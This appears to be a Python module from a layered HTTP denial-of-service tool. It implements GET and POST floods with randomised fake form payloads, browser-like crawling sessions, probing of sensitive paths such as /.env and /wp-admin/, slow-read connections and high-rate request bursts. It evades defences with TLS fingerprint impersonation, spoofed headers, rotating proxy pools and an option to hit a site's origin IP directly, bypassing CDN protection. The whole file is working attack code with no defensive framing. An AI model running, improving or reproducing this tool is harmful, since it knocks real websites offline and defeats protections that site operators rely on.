import asyncio
import time
import random
import logging
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse

from evasion.tls_fingerprint import get_curl_impersonate
from evasion.header_engine import build_advanced_headers, build_minimal_headers, buildblock
from engines.adaptive_engine import AdaptiveEngine

logger = logging.getLogger("enhanced_v6")

MAX_CONCURRENT = 50
_sem = None

def _get_sem():
    global _sem
    if _sem is None:
        _sem = asyncio.Semaphore(MAX_CONCURRENT)
    return _sem


class PolymorphicPayload:
    JSON_TEMPLATES = [
        '{{"username":"{user}","password":"{pass}","remember":{bool}}}',
        '{{"email":"{email}","name":"{name}","action":"{action}"}}',
        '{{"search":"{query}","page":{page},"limit":{limit},"sort":"{sort}"}}',
        '{{"token":"{token}","data":"{data}","timestamp":{ts}}}',
        '{{"id":{id},"type":"{type}","value":"{value}","meta":{{"source":"{source}"}}}}',
    ]
    FORM_TEMPLATES = [
        "username={user}&password={pass}&submit=Login&remember={bool}",
        "email={email}&name={name}&message={msg}&action={action}",
        "search={query}&page={page}&sort={sort}&limit={limit}",
        "token={token}&data={data}&timestamp={ts}",
        "id={id}&type={type}&value={value}&source={source}",
    ]

    @staticmethod
    def _random_string(length: int = 8) -> str:
        return buildblock(length)

    @staticmethod
    def _random_email() -> str:
        return f"{buildblock(6)}@{buildblock(4)}.com"

    @staticmethod
    def _generate(template: str, is_json: bool = True) -> str:
        values = {
            "user": PolymorphicPayload._random_string(8),
            "pass": PolymorphicPayload._random_string(12),
            "bool": random.choice(["true", "false"]),
            "email": PolymorphicPayload._random_email(),
            "name": PolymorphicPayload._random_string(10),
            "action": random.choice(["login", "register", "update", "delete", "search"]),
            "query": PolymorphicPayload._random_string(6),
            "page": str(random.randint(1, 100)),
            "limit": str(random.choice([10, 20, 50, 100])),
            "sort": random.choice(["asc", "desc", "relevance", "date"]),
            "token": buildblock(32),
            "data": buildblock(16),
            "ts": str(int(time.time() * 1000)),
            "id": str(random.randint(1, 99999)),
            "type": random.choice(["user", "post", "comment", "product", "order"]),
            "value": PolymorphicPayload._random_string(8),
            "source": random.choice(["web", "mobile", "api", "admin"]),
            "msg": PolymorphicPayload._random_string(20),
        }
        return template.format(**values)

    @classmethod
    def generate_json(cls) -> str:
        template = random.choice(cls.JSON_TEMPLATES)
        return cls._generate(template, is_json=True)

    @classmethod
    def generate_form(cls) -> Tuple[str, str]:
        template = random.choice(cls.FORM_TEMPLATES)
        data = cls._generate(template, is_json=False)
        content_type = random.choice([
            "application/x-www-form-urlencoded",
            "application/json",
        ])
        return data, content_type


async def _request_with_sem(sem, coro):
    async with sem:
        return await coro


async def attack_http_get_flood(url: str, proxy: Optional[str], adaptive: AdaptiveEngine,
                                duration: float, target_rps: int) -> Dict:
    metrics = {"completed": 0, "failed": 0, "timeout": 0, "total": 0}
    start = time.time()
    sem = _get_sem()

    from curl_cffi.requests import AsyncSession
    kwargs = {"impersonate": get_curl_impersonate(), "timeout": 8}
    if proxy:
        kwargs["proxies"] = {"all": proxy}

    async with AsyncSession(**kwargs) as sess:
        async def single_request():
            try:
                u = f"{url}?{buildblock(6)}={buildblock(10)}&_{int(time.time()*1000)}"
                headers = build_advanced_headers(u, "GET")
                resp = await sess.get(u, headers=headers, timeout=8)
                adaptive.record_response(resp.status_code, "http_get_flood")
                return resp.status_code
            except Exception:
                adaptive.record_response(0, "http_get_flood")
                return 0

        while time.time() - start < duration:
            if adaptive.should_throttle():
                await asyncio.sleep(adaptive.get_throttle_delay())
            batch_size = min(max(target_rps, 10), MAX_CONCURRENT)
            tasks = [_request_with_sem(sem, single_request()) for _ in range(batch_size)]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for result in results:
                metrics["total"] += 1
                if isinstance(result, int) and result >= 200:
                    metrics["completed"] += 1
                else:
                    metrics["failed"] += 1
    return metrics


async def attack_http_post_flood(url: str, proxy: Optional[str], adaptive: AdaptiveEngine,
                                 duration: float, target_rps: int) -> Dict:
    metrics = {"completed": 0, "failed": 0, "timeout": 0, "total": 0}
    start = time.time()
    sem = _get_sem()

    from curl_cffi.requests import AsyncSession
    kwargs = {"impersonate": get_curl_impersonate(), "timeout": 8}
    if proxy:
        kwargs["proxies"] = {"all": proxy}

    async with AsyncSession(**kwargs) as sess:
        async def single_request():
            try:
                u = f"{url}?_{int(time.time()*1000)}"
                headers = build_advanced_headers(u, "POST")
                data, content_type = PolymorphicPayload.generate_form()
                headers["Content-Type"] = content_type
                resp = await sess.post(u, headers=headers, data=data, timeout=8)
                adaptive.record_response(resp.status_code, "http_post_flood")
                return resp.status_code
            except Exception:
                adaptive.record_response(0, "http_post_flood")
                return 0

        while time.time() - start < duration:
            if adaptive.should_throttle():
                await asyncio.sleep(adaptive.get_throttle_delay())
            batch_size = min(max(target_rps, 10), MAX_CONCURRENT)
            tasks = [_request_with_sem(sem, single_request()) for _ in range(batch_size)]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for result in results:
                metrics["total"] += 1
                if isinstance(result, int) and result >= 200:
                    metrics["completed"] += 1
                else:
                    metrics["failed"] += 1
    return metrics


async def attack_browser_emulation(url: str, proxy: Optional[str], adaptive: AdaptiveEngine,
                                   duration: float, target_rps: int) -> Dict:
    metrics = {"completed": 0, "failed": 0, "timeout": 0, "total": 0}
    start = time.time()
    sem = _get_sem()

    page_paths = [
        "/", "/about", "/contact", "/products", "/services",
        "/blog", "/news", "/faq", "/terms", "/privacy",
        "/sitemap.xml", "/robots.txt", "/feed/", "/rss",
    ]

    from curl_cffi.requests import AsyncSession
    kwargs = {"impersonate": get_curl_impersonate(), "timeout": 8}
    if proxy:
        kwargs["proxies"] = {"all": proxy}

    async with AsyncSession(**kwargs) as sess:
        async def single_session():
            try:
                parsed = urlparse(url)
                base = f"{parsed.scheme}://{parsed.netloc}"
                num_pages = random.randint(3, 5)
                session_pages = random.sample(page_paths, min(num_pages, len(page_paths)))
                for path in session_pages:
                    page_url = base + path
                    headers = build_advanced_headers(page_url)
                    resp = await sess.get(page_url, headers=headers, timeout=8)
                    adaptive.record_response(resp.status_code, "browser")
                    metrics["total"] += 1
                    if resp.status_code >= 200:
                        metrics["completed"] += 1
                    else:
                        metrics["failed"] += 1
                    await asyncio.sleep(random.uniform(0.5, 2.0))
            except Exception:
                metrics["total"] += 1
                metrics["failed"] += 1
                adaptive.record_response(0, "browser")

        while time.time() - start < duration:
            if adaptive.should_throttle():
                await asyncio.sleep(adaptive.get_throttle_delay())
            batch_size = min(max(target_rps, 5), 15)
            tasks = [_request_with_sem(sem, single_session()) for _ in range(batch_size)]
            await asyncio.gather(*tasks, return_exceptions=True)
    return metrics


async def attack_dynamic(url: str, proxy: Optional[str], adaptive: AdaptiveEngine,
                         duration: float, target_rps: int) -> Dict:
    metrics = {"completed": 0, "failed": 0, "timeout": 0, "total": 0}
    start = time.time()
    sem = _get_sem()

    methods = ["GET", "HEAD", "OPTIONS", "TRACE"]
    paths = [
        "/{r}", "/?s={r}", "/search?q={r}", "/?p={r}",
        "/index.php?id={r}", "/page/{r}", "/api/{r}",
        "/cdn-cgi/trace", "/.env", "/wp-admin/",
        "/administrator/", "/phpinfo.php", "/server-status",
    ]

    from curl_cffi.requests import AsyncSession
    kwargs = {"impersonate": get_curl_impersonate(), "timeout": 8}
    if proxy:
        kwargs["proxies"] = {"all": proxy}

    async with AsyncSession(**kwargs) as sess:
        async def single_request():
            try:
                method = random.choice(methods)
                path = random.choice(paths).replace("{r}", buildblock(8))
                parsed = urlparse(url)
                target = f"{parsed.scheme}://{parsed.netloc}{path}"
                headers = build_advanced_headers(target, method)
                resp = await sess.request(method, target, headers=headers, timeout=8)
                adaptive.record_response(resp.status_code, "dynamic")
                return resp.status_code
            except Exception:
                adaptive.record_response(0, "dynamic")
                return 0

        while time.time() - start < duration:
            if adaptive.should_throttle():
                await asyncio.sleep(adaptive.get_throttle_delay())
            batch_size = min(max(target_rps, 10), MAX_CONCURRENT)
            tasks = [_request_with_sem(sem, single_request()) for _ in range(batch_size)]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for result in results:
                metrics["total"] += 1
                if isinstance(result, int) and result >= 200:
                    metrics["completed"] += 1
                else:
                    metrics["failed"] += 1
    return metrics


async def attack_slow(url: str, proxy: Optional[str], adaptive: AdaptiveEngine,
                      duration: float, target_rps: int) -> Dict:
    metrics = {"completed": 0, "failed": 0, "timeout": 0, "total": 0}
    start = time.time()
    sem = _get_sem()

    from curl_cffi.requests import AsyncSession
    kwargs = {"impersonate": get_curl_impersonate(), "timeout": 30}
    if proxy:
        kwargs["proxies"] = {"all": proxy}

    async with AsyncSession(**kwargs) as sess:
        async def single_request():
            try:
                headers = build_advanced_headers(url)
                resp = await sess.get(url, headers=headers, timeout=30)
                async for chunk in resp.aiter_content(chunk_size=1):
                    await asyncio.sleep(random.uniform(0.1, 0.5))
                adaptive.record_response(resp.status_code, "slow")
                metrics["total"] += 1
                if resp.status_code >= 200:
                    metrics["completed"] += 1
                else:
                    metrics["failed"] += 1
            except Exception:
                adaptive.record_response(0, "slow")
                metrics["total"] += 1
                metrics["failed"] += 1

        while time.time() - start < duration:
            if adaptive.should_throttle():
                await asyncio.sleep(adaptive.get_throttle_delay())
            batch_size = min(max(target_rps, 5), 15)
            tasks = [_request_with_sem(sem, single_request()) for _ in range(batch_size)]
            await asyncio.gather(*tasks, return_exceptions=True)
    return metrics


async def attack_pps(url: str, proxy: Optional[str], adaptive: AdaptiveEngine,
                     duration: float, target_rps: int) -> Dict:
    metrics = {"completed": 0, "failed": 0, "timeout": 0, "total": 0}
    start = time.time()
    sem = _get_sem()

    from curl_cffi.requests import AsyncSession
    kwargs = {"impersonate": get_curl_impersonate(), "timeout": 5}
    if proxy:
        kwargs["proxies"] = {"all": proxy}

    async with AsyncSession(**kwargs) as sess:
        async def single_request():
            try:
                headers = build_minimal_headers(url)
                resp = await sess.get(url, headers=headers, timeout=5)
                adaptive.record_response(resp.status_code, "pps")
                return resp.status_code
            except Exception:
                adaptive.record_response(0, "pps")
                return 0

        while time.time() - start < duration:
            if adaptive.should_throttle():
                await asyncio.sleep(adaptive.get_throttle_delay())
            batch_size = min(max(target_rps, 20), MAX_CONCURRENT)
            tasks = [_request_with_sem(sem, single_request()) for _ in range(batch_size)]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for result in results:
                metrics["total"] += 1
                if isinstance(result, int) and result >= 200:
                    metrics["completed"] += 1
                else:
                    metrics["failed"] += 1
    return metrics


ATTACK_METHODS = {
    "http_get_flood": attack_http_get_flood,
    "http_post_flood": attack_http_post_flood,
    "browser": attack_browser_emulation,
    "dynamic": attack_dynamic,
    "slow": attack_slow,
    "pps": attack_pps,
}


async def run_v6_attack(url: str, duration: int, method: str = "http_get_flood",
                        rps: int = 100, proxy: Optional[str] = None,
                        proxy_pool = None, proxy_type: str = "datacenter",
                        origin_ip: Optional[str] = None,
                        adaptive: bool = True) -> Dict:
    if method not in ATTACK_METHODS:
        logger.error(f"Unknown attack method: {method}")
        return {"completed": 0, "failed": 0, "timeout": 0, "total": 0}

    attack_func = ATTACK_METHODS[method]
    adaptive_engine = AdaptiveEngine(auto_throttle=adaptive)

    if origin_ip:
        parsed = urlparse(url)
        url = f"{parsed.scheme}://{origin_ip}{parsed.path or '/'}"
        if parsed.query:
            url += "?" + parsed.query

    num_workers = min(max(rps // 50, 1), 5)
    per_worker_duration = duration

    logger.info(f"Starting v6 {method} attack: {num_workers} workers, {rps} RPS, {duration}s duration")
    if adaptive:
        logger.info("Adaptive mode: ENABLED")

    async def worker(wid: int):
        worker_proxy = proxy
        try:
            if proxy_pool and not proxy:
                try:
                    ps = await proxy_pool.get_proxy(proxy_type)
                    worker_proxy = ps.url if ps else None
                except Exception:
                    worker_proxy = None
            result = await attack_func(
                url=url,
                proxy=worker_proxy,
                adaptive=adaptive_engine,
                duration=per_worker_duration,
                target_rps=rps // num_workers,
            )
            return result
        except Exception as e:
            logger.debug(f"Worker {wid} error: {e}")
            return {"completed": 0, "failed": 0, "timeout": 0, "total": 0}

    tasks = [worker(i) for i in range(num_workers)]
    results = await asyncio.gather(*tasks, return_exceptions=True)

    total_metrics = {"completed": 0, "failed": 0, "timeout": 0, "total": 0}
    for result in results:
        if isinstance(result, dict):
            for key in total_metrics:
                total_metrics[key] += result.get(key, 0)

    total_metrics["adaptive_status"] = adaptive_engine.get_status()
    return total_metrics
